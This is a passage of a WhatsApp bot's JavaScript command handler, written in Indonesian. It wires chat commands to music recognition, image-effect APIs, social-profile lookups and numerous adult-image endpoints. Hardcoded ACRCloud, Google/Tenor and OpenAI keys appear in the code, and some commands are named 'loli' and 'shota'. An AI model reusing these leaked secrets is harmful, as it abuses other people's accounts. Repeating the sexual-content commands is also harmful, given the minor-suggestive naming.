setReply(`Saved ${path} to file!`)
}
break
	//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
case 'whatmusic':{
const acrcloud = require("acrcloud");
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});
if (isQuotedAudio) {
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
conn.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {})
});
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId

try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
conn.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {})
});
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio atau video")
}
}
break
//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//

case 'out':
if (!isGroup) return 
if (!isOwner) return onlyOwner()
await conn.groupLeave(from)
break


case 'moveongc':{
if (isGroup && !isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
if(isGroup && !q) return setReply("Masukan linkgc")
if(!isGroup && !q) return setReply(`Ketik ${prefix+command} idGc|linkgc`)
if(!isGroup && !q.includes("|")) return setReply(`Ketik ${prefix+command} idGc|linkgc`) 
let idGc= isGroup? from : q.split("|")[0];
let linkGc = isGroup? q : q.split("|")[1]
let rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = isGroup? q.match(rex1) : q.split("|")[1].match(rex1)
if (code == null) return  setReply("No invite url detected.");
let kode = code[0].replace("chat.whatsapp.com/", "");
let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(kode).catch(async () => {
return setReply("Invalid invite url.");
});

let position = null
Object.keys(sewa).forEach((i) => {
if (sewa[i].id === idGc) {
position = i
}
})

if (position !== null) {
sewa[position].id = id
sewa[position].group = subject
sewa[position].linkgc = linkGc

 let text =`
Succes move 

*Name:* ${subject}
*Id:* ${id}
*Days:* ${conn.msToDate(sewa[position].expired - Date.now())}
*Countdown:* ${sewa[position].expired - Date.now()}`
await conn.sendMessage(from,{text},{quoted: setQuoted})
await conn.groupAcceptInvite(kode)
await sleep(2000)
await conn.groupLeave(idGc)
await sleep(2000)
await conn.sendMessage(id,{text:"Move on gc succes"},{quoted: setQuoted})
 } else setReply("id group tidak di temukan di data base")

}
break



case 'infogempa':{
	let scrapy = require("node-scrapy")
	const model = ['tr:nth-child(1) td']
	fetch('https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg').then((res) => res.text()).then((body) => {
	let result = scrapy.extract(body, model)
	let waktu = result[1] || "Tidak ada data"
	let lintang = result[2] || "Tidak ada data"
	let bujur = result[3] || "Tidak ada data";
	let magnitudo = result[4] || "Tidak ada data"
	let kedalaman = result[5] || "Tidak ada data"
	let lokasi = result[6] || "Tidak ada data"
	const teks = `informasi gempa terbaru:\n\nWaktu: *${waktu}*\nBujur: *${bujur}*\nLintang: *${lintang}*\nMagnitudo: *${magnitudo}*\nKedalaman: *${kedalaman}*\nLokasi: *${lokasi}*`.trim()
	setReply(teks)
	 })
	 }
	 break





case 'caklontong':{
user.glimit -= 1
let but = [{ buttonId: `${prefix}ceklimit`, buttonText: { displayText: "Limit" }, type: 1 },{ buttonId: `${prefix}caklontong`, buttonText: { displayText: "Main lagi" }, type: 1 } ]
let timeout = 60000
let money = randomNomor(1500)
let tiketcoin = 1
let id = m.chat
if (id in conn.caklontong) return setReply('Masih ada soal belum terjawab di chat ini')
let src = JSON.parse(fs.readFileSync('./lib/game/caklontong.js'));
let json = src[Math.floor(Math.random() * src.length)].result
let petunjuk = json.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, ' - ')
let caption = `
${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Petunjuk: ${petunjuk}
Bonus: Rp ${money} 
`.trim()
conn.caklontong[id] = [
await setReply(caption),
json, money,
setTimeout(() => {
let teks =`*Waktu habis!*

Jawabannya adalah *${json.jawaban}*

${json.desc}`
if (conn.caklontong[id]) conn.sendButMessage(from,teks,copyright,but,m)
delete conn.caklontong[id]
}, timeout)
]
}
break
    // Ephoto 360
case 'wetglass':
		case 'multicolor3d':
		case 'watercolor':
		case 'luxurygold':
		case 'galaxywallpaper':
		case 'lighttext':
		case 'beautifulflower':
		case 'puppycute':
		case 'royaltext':
		case 'heartshaped':
		case 'birthdaycake':
		case 'galaxystyle':
		case 'hologram3d':
		case 'greenneon':
		case 'glossychrome':
		case 'greenbush':
		case 'metallogo':
		case 'noeltext':
		case 'glittergold':
		case 'textcake':
		case 'starsnight':
		case 'wooden3d':
		case 'textbyname':
		case 'writegalacy':
		case 'galaxybat':
		case 'snow3d':
		case 'birthdayday':
		case 'goldplaybutton':
		case 'silverplaybutton':
		case 'freefire':
			if (args.length == 0) return reply(`Example: ${prefix + command} Maulana `)
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${args}` } })
			break

case 'shadow':
		case 'cup':
		case 'cup1':
		case 'romance':
		case 'smoke':
		case 'burnpaper':
		case 'lovemessage':
		case 'undergrass':
		case 'love':
		case 'coffe':
		case 'woodheart':
		case 'woodenboard':
		case 'summer3d':
		case 'wolfmetal':
		case 'nature3d':
		case 'underwater':
		case 'golderrose':
		case 'summernature':
		case 'letterleaves':
		case 'glowingneon':
		case 'fallleaves':
		case 'flamming':
		case 'harrypotter':
		case 'carvedwood':
			if (args.length == 0) return reply(`Example: ${prefix + command} Lana Wibu`)
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${args}` } })
			break

    // Text Prome
case 'pornhub':
		case 'glitch':
		case 'avenger':
		case 'space':
		case 'ninjalogo':
		case 'marvelstudio':
		case 'lionlogo':
		case 'wolflogo':
		case 'steel3d':
		case 'wallgravity':
			if (args.length == 0) return reply(`Example: ${prefix + command} Lana Wibu`)
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}` } })
			break

case 'blackpink':
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
		case 'thunder':
			if (args.length == 0) return reply(`Example: ${prefix + command} Lana wibu`)
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${args}` } })
			break

case 'aiimage': {
        if (!q) {
            return m.reply("*Masukan dengan benar*\ncontoh\n\n aiimage Kucing gemoy ")
        }
        m.reply(mess.wait)
        let buttons = [
                {
                    buttonId: `/aiimagee ${q}`,
                    buttonText: { displayText: 'Next' },
                    type: 1
                },
            ]
           let buttonMessage = {
 image: { 
                url: `https://api.lolhuman.xyz/api/dall-e?apikey=${apikey}&text=${q}`
            },
            caption: "NIH HASILNYA!\n" + q,
            footer: `${fake1}`,
            buttons: buttons
        }
        conn.sendMessage(from, buttonMessage, { quoted: m } )
        }
        break
//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
case  'tts':
if (!q) return setReply('masukan teks contoh\n\n.tts oke bang')
const gtts = require( 'node-gtts')
function tts(text, lang = 'id') {
 // console.log(lang, text)
  return new Promise((resolve, reject) => {
    try {
      let tts = gtts(lang)
      let filePath =  (1 * new Date) + '.mp3'
      tts.save(filePath, text, () => {
        resolve(fs.readFileSync(filePath))
        fs.unlinkSync(filePath)
				
      })
    } catch (e) { reject(e) }
  })
}    

const defaultLang = 'id'


  let lang = args[0]
  let text = args.slice(1).join(' ')
  if ((args[0] || '').length !== 2) {
    lang = defaultLang
    text = args.join(' ')
  }
  if (!text && m.quoted?.text) text = m.quoted.text

  let ras
  try { ras = await tts(text, lang) }
  catch (e) {
    m.reply(e + '')
    text = args.join(' ')
    if (!text) setReply( `Use example ${prefix}${command} en hello world`)
    ras = await tts(text, defaultLang)
  } finally {
    if (ras) conn.sendMedia(from, ras, m, {caption: "Nih"})
//conn.sendFile(m.chat, res, 'tts.opus', null, m, true)
  }
 
break

case 'art':
		case 'awoo':
		case 'bts':
		case 'cecan':
		case 'cogan':
		case 'elaina':
		case 'exo':
		case 'elf':
		case 'estetic':
		case 'kanna':
		case 'loli':
		case 'neko':
		case 'waifu':
		case 'shota':
		case 'husbu':
		case 'sagiri':
		case 'shinobu':
		case 'megumin':
		case 'wallnime':
		case 'quotesimage':
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
			break

case  'bj':
		case 'ero':
		case 'cum':
		case 'feet':
		case 'yuri':
		case 'trap':
		case 'lewd':
		case 'feed':
		case 'eron':
		case 'solo':
		case 'gasm':
		case 'poke':
		case 'anal':
		case 'holo':
		case 'tits':
		case 'kuni':
		case 'kiss':
		case 'erok':
		case 'smug':
		case 'baka':
		case 'solog':
		case 'feetg':
		case 'lewdk':
		case 'waifu':
		case 'pussy':
		case 'femdom':
		case 'cuddle':
		case 'hentai':
		case 'eroyuri':
		case 'cum_jpg':
		case 'blowjob':
		case 'erofeet':
		case 'holoero':
		case 'classic':
		case 'erokemo':
		case 'fox_girl':
		case 'futanari':
		case 'lewdkemo':
		case 'wallpaper':
		case 'pussy_jpg':
		case 'kemonomimi':
		case 'nsfw_avatar':
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } })
			break
    
case 'jadianime':{
if (!isImage && !isQuotedImage) return reply(`Kirim gambar lalu reply ${prefix + command} atau tag gambar yang sudah dikirim`)
setReply(mess.wait)
try{
let ahah = await conn.downloadAndSaveMediaMessage(quoted)
let Lana = await TelegraPh(ahah)
let ini_gen = `${command}`
//ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
let get_result = await getBuffer(`https://api.lolhuman.xyz/api/imagetoanime?apikey=${apikey}&img=${Lana}`)
//let gambar = await getBuffer(`https://api.lolhuman.xyz/api/animeai?img=${owgi}&apikey=${apikey}`)
//conn.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: m})
conn.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${baileysVersion}`,
body:`Bot aktif ${runtime(process.uptime())}`,
previewType:"PHOTO", 
thumbnail: fs.readFileSync('./stik/reply.jpg'),
sourceUrl:`https://maulanabot.my.id`
}}, image: get_result, caption: `*Nih Kamu jadi Anime*`}, { quoted: m })
fs.unlinkSync(ahah) 
}catch(err){
console.log((err) => setReply('Error coba lag kontol'))
}
}
break

case 'chiisaihentai':
		case 'trap':
		case 'blowjob':
		case 'yaoi':
		case 'ecchi':
		case 'hentai':
		case 'ahegao':
		case 'hololewd':
		case 'sideoppai':
		case 'animefeets':
		case 'animebooty':
		case 'animethighss':
		case 'hentaiparadise':
		case 'animearmpits':
		case 'hentaifemdom':
		case 'lewdanimegirls':
		case 'biganimetiddies':
		case 'animebellybutton':
		case 'hentai4everyone':
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}` } })
			break
    
		case 'arcade8bit':
		case 'battlefield4':
		case 'pubg':
			if (args.length == 0) return reply(`Example: ${prefix + command} Lana`)
			conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}` } })
			break
    
case 'pinterest':
			if (args.length == 0) return reply(`Example: ${prefix + command} cewe cantik`)
			axios.get(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=${args}`).then(({ data }) => {
				conn.sendMessage(from, { image: { url: data.result } })
			})
			break
    
case 'igstalk':
			if (args.length == 0) return reply(`Example: ${prefix + command} whyzzxy`)
			axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Full Name : ${data.result.fullname}\n`
				caption += `Posts : ${data.result.posts}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(from, { image: { url: data.result.photo_profile }, caption })
			})
			break

    case 'tiktokstalk':
			if (args.length == 0) return reply(`Example: ${prefix + command} whyzzzxy`)
			axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Nickname : ${data.result.nickname}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Followings : ${data.result.followings}\n`
				caption += `Likes : ${data.result.likes}\n`
				caption += `Video : ${data.result.video}\n`
				caption += `Bio : ${data.result.bio}\n`
				conn.sendMessage(from, { image: { url: data.result.user_picture }, caption })
			})
			break

case 'igstalk':
			if (args.length == 0) return reply(`Example: ${prefix + command} whyzzxy`)
			axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikey}`).then(({ data }) => {
				var caption = `Username : ${data.result.username}\n`
				caption += `Full Name : ${data.result.fullname}\n`
				caption += `Posts : ${data.result.posts}\n`
				caption += `Followers : ${data.result.followers}\n`
				caption += `Following : ${data.result.following}\n`
				caption += `Bio : ${data.result.bio}`
				conn.sendMessage(from, { image: { url: data.result.photo_profile }, caption })
			})
			break
    /*
case 'aii':
case 'openai':
case 'ai':{
if (args.length < 1) return reply(`Masukkan kata kunci!\n\n*Contoh:* Apa saja jenis bot WhatsApp `)
const { Configuration, OpenAIApi } = require("openai")
const configuration = new Configuration({
  apiKey: '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',
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
              prompt: q,
              temperature: 0,
              max_tokens: 1000,
              top_p: 1,
              frequency_penalty: 0.2,
              presence_penalty: 0,
            });
const resultnya = response.data.choices[0].text
setReply(resultnya)
}
break
*/
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
let xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
conn.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })

break

    case 'jarak':{
//if(!q) return setReply("Masukan query")
if(!q.includes("|")) return setReply("Contoh jogja|jakarta")
let Dari = q.split("|")[0]
let Ke = q.split("|")[1]
async function jarak(dari, ke) {
  let url = `https://www.google.com/search?q=${encodeURIComponent("jarak " + dari + " ke " + ke)}&hl=id`
  let { data } = await axios(url)
  //console.log(data)
  let $ = cheerio.load(data)
  let img = data.split("var s=\'")[1].split("\'")[0]
  let res = {
   result: {
    img: /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,`[1], 'base64') : '',
    desc: $("div.BNeawe.deIvCb.AP7Wnd").text()
    }
  }
  return res
}

let nana = await jarak(Dari,Ke)
let image = nana.result.img
let caption = `*Google Maps* \n\n${nana.result.desc}`
let mok = //[{"buttonId": `y`,"buttonText": {"displayText": `Okee`},"type": "RESPONSE"}]
  //const imgg = await reSize(image, 300, 300)     
conn.sendButImage(from, caption,copyright,image,mok)
//conn.sendMessage(from,{image, caption},{quoted: dev})
} 
break

case 'totalfitur':
case 'totalfeature':{
setReply(`Total Feature ${fake1} Adalah : ${totalFitur()}\n\n Jika kamu Mau script Bot ini Silahkan ketik perintah\n\n#Script`)
}
break

case 'wattpad':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wattpad?apikey=${apikey}&url=${args[0]}`)
			var caption = `Title : ${data.result.title}\n`
			caption += `Rating : ${data.result.rating}\n`
			caption += `Motify date : ${data.result.modifyDate}\n`
			caption += `Create date: ${data.result.createDate}\n`
			caption += `Word : ${data.result.word}\n`
			caption += `Comment : ${data.result.comment}\n`
			caption += `Vote : ${data.result.vote}\n`
			caption += `Reader : ${data.result.reader}\n`
			caption += `Pages : ${data.result.pages}\n`
			caption += `Description : ${data.result.desc}\n\n`
			caption += `Story : \n${data.result.story}`
			conn.sendMessage(from, { image: { url: data.result.photo }, caption })
			break

case 'wattpadsearch':
			if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${apikey}&query=${args}`)
			var Text = 'Wattpad Seach : \n'
			for (var x of data.result) {
				Text += `Title : ${x.title}\n`
				Text += `Url : ${x.url}\n`
				Text += `Part : ${x.parts}\n`
				Text += `Motify date : ${x.modifyDate}\n`
				Text += `Create date: ${x.createDate}\n`
				Text += `Coment count: ${x.commentCount}\n\n`
			}
			reply(Text)
			break

  case 'ceritahoror':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
			var caption = `Title : ${data.result.title}\n`
			caption += `Desc : ${data.result.desc}\n`
			caption += `Story :\n${data.result.story}\n`
			xdev.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
			break
    case 'quotesanime':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${apikey}`)
			reply(`_${data.result.quote}_\n\n*― ${data.result.character}*\n*― ${data.result.anime} ${data.result.episode}*`)
			break
    case 'faktaunik':
		case 'katabijak':
		case 'pantun':
		case 'bucin':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
			reply(data.result)
			break
    
    case 'randomnama':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/nama?apikey=${apikey}`)
			reply(data.result)
			break
    
    case 'artinama':
			if (args.length == 0) return reply(`Example: ${prefix + command} Maulana`)
			axios.get(`https://api.lolhuman.xyz/api/artinama?apikey=${apikey}&nama=${args}`).then(({ data }) => {
				reply(data.result)
			})
			break
    
case 'cekjadian':
  if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
			axios.get(`https://api.lolhuman.xyz/api/jadian/${args[0]}/${args[1]}/${args[2]}?apikey=${apikey}`).then(({ data }) => {
				var text = `*Karakteristik* : ${data.result.karakteristik}\n`
				text += `*Deskripsi* : ${data.result.deskripsi}`
				reply(text)
			})
			break
case 'tebakumur':
			if (args.length == 0) return reply(`Example: ${prefix + command} Maulana`)
			axios.get(`https://api.lolhuman.xyz/api/tebakumur?apikey=${apikey}&name=${args}`).then(({ data }) => {
				var text = `Nama : ${data.result.name}\n`
				text += `Umur : ${data.result.age}`
				reply(text)
			})
			break

case 'kisahnabi':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return reply(`Contoh : ${prefix + command} Muhammad`)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `• Name : ${data.result.name}\n`
text += `• Lahir : ${data.result.thn_kelahiran}\n`
text += `• Umur : ${data.result.age}\n`
text += `• Tempat : ${data.result.place}\n`
text += `• Story : \n${data.result.story}`
setReply(text)
})
.catch((err) => setReply('Server sedang Error coba lag besok!'))
}
break
case 'asmaulhusna':{
setReply(mess.wait)
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
var get_result = get_result.result
ini_txt = `No : ${get_result.index}\n`
ini_txt += `Latin: ${get_result.latin}\n`
ini_txt += `Arab : ${get_result.ar}\n`
ini_txt += `Indonesia : ${get_result.id}\n`
ini_txt += `English : ${get_result.en}`
setReply(ini_txt)
}
break
case 'listsurah': {
setReply(mess.wait)
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
var get_result = get_result.result
var ini_txt = 'List Surah : \n'
for (var x in get_result) {
ini_txt += `${x}. ${get_result[x]}\n`
}
setReply(ini_txt)
}
break
case 'bucin3':{
let quotedbucin = await fetchJson(`https://api.lolhuman.xyz/api/random/katabucin?apikey=${apikey}`)
setReply(quotedbucin.result+'\n\n-- Kata Bucin ').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break

case 'pantun':{
let get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
setReply(get_result.result+'\n\n-- Pantun').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break
case 'asupan':{
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=${apikey}`)
var ini_buffer = await getBuffer(get_result.result)           
conn.sendMessage(from,{video: ini_buffer, caption: "*MANTAP WKWK*"}, {quoted : m}).catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break 

case 'jadwaltvnow':{
var get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var get_result = get_result.result
ini_txt = `JADWAL TV NOW :\n\n`
for (var x in get_result) {
ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
}
setReply(ini_txt)
}
break

case 'jjmeryani':{
let kaydt = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json')
let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
conn.sendMessage(m.chat,{video:{url:hayu},caption:`nih kak🗿`},{quoted: m})
}
break

case 'quotes':
var data = await fetchJson(`https://megayaa.herokuapp.com/api/randomquote`)
setReply(data.result.quotes+'\n\n-- '+data.result.author)
break

case 'spotify':
    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
    axios.get(`https://api.lolhuman.xyz/api/spotify?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
        var caption = `Title : ${data.result.title}\n`
        caption += `Artists : ${data.result.artists}\n`
        caption += `Duration : ${data.result.duration}\n`
        caption += `Popularity : ${data.result.popularity}\n`
        caption += `Preview : ${data.result.preview_url}\n`
         conn.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
            conn.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3`, ptt: true })
        })
    })
    break

case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
await conn.sendImageAsSticker(from, res.url, m)
  //xdev.sendStimg(from, res.url, dev)
//await fs.unlinkSync(encmedia)
}
}
break

case 'quotesislami':{
if (!isGroup) return setReply(mess.only.group)
let quotedislami = await fetchJson(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${apikey}`)
setReply(quotedislami.result+'\n\n-- Semoga Bermanfaat ').catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break	
case 'ngewe':
case 'memek':
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
